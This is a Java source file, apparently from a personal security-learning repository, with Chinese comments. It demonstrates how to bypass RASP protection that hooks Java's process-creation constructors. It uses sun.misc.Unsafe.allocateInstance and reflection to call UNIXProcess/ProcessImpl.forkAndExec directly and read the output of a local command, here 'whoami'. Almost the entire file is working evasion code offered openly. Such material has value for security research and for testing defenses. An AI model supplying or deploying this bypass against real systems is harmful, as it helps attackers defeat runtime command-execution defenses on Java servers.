package com.p2hm1n.javabasics.localrce;

import sun.misc.Unsafe;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * RASP把UNIXProcess/ProcessImpl类的构造方法给拦截了，可以利用Java的几个特性就可以绕过RASP执行本地命令
 * 使用sun.misc.Unsafe.allocateInstance(Class)特性可以无需new或者newInstance创建UNIXProcess/ProcessImpl类对象。
 * 反射UNIXProcess/ProcessImpl类的forkAndExec方法。
 * 构造forkAndExec需要的参数并调用。
 * 反射UNIXProcess/ProcessImpl类的initStreams方法初始化输入输出结果流对象。
 * 反射UNIXProcess/ProcessImpl类的getInputStream方法获取本地命令执行结果(如果要输出流、异常流反射对应方法即可)。
 *
 * 测试环境 8u102，需保证 UNIXProcess/ProcessImpl 下面有相应的 Field
 */
public class ForkAndExec {
    public static void main(String[] args) throws Exception {
        String[] strs = new String[]{"whoami"};

        // 构造 unsafe 对象
        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);

        Class processClass = null;

        // 构造 UNIXProcess/ProcessImpl 对象
        try {
            processClass = Class.forName("java.lang.UNIXProcess");
        } catch (ClassNotFoundException e) {
            processClass = Class.forName("java.lang.ProcessImpl");
        }

        Object processObject = unsafe.allocateInstance(processClass);


        byte[][] execArgs = new byte[strs.length - 1][];
        int size = execArgs.length; // For added NUL bytes

        for (int i = 0; i < execArgs.length; i++) {
            execArgs[i] = strs[i + 1].getBytes();
            size += execArgs[i].length;
        }

        byte[] argBlock = new byte[size];
        int i = 0;

        for (byte[] arg : execArgs) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
            // No need to write NUL bytes explicitly
        }

        int[] envc = new int[1];
        int[] std_fds = new int[]{-1, -1, -1};
        Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
        Field helperpathField = processClass.getDeclaredField("helperpath");
        launchMechanismField.setAccessible(true);
        helperpathField.setAccessible(true);
        Object launchMechanismObject = launchMechanismField.get(processObject);
        byte[] helperpathObject = (byte[]) helperpathField.get(processObject);

        int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);

        Method forkMethod = processClass.getDeclaredMethod("forkAndExec", new Class[]{
                int.class, byte[].class, byte[].class, byte[].class, int.class,
                byte[].class, int.class, byte[].class, int[].class, boolean.class
        });

        forkMethod.setAccessible(true);// 设置访问权限

        int pid = (int) forkMethod.invoke(processObject, new Object[]{
                ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, execArgs.length,
                null, envc[0], null, std_fds, false
        });

        // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流
        Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
        initStreamsMethod.setAccessible(true);
        initStreamsMethod.invoke(processObject, std_fds);

        // 获取本地执行结果的输入流
        Method getInputStreamMethod = processClass.getMethod("getInputStream");
        getInputStreamMethod.setAccessible(true);
        InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        int a = 0;
        byte[] b = new byte[1024];

        while ((a = in.read(b)) != -1) {
            baos.write(b, 0, a);
        }

        System.out.println(baos.toString());
    }

    private static byte[] toCString(String s) {
        if (s == null) {
            return null;
        }
        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0,
                result, 0,
                bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }
}
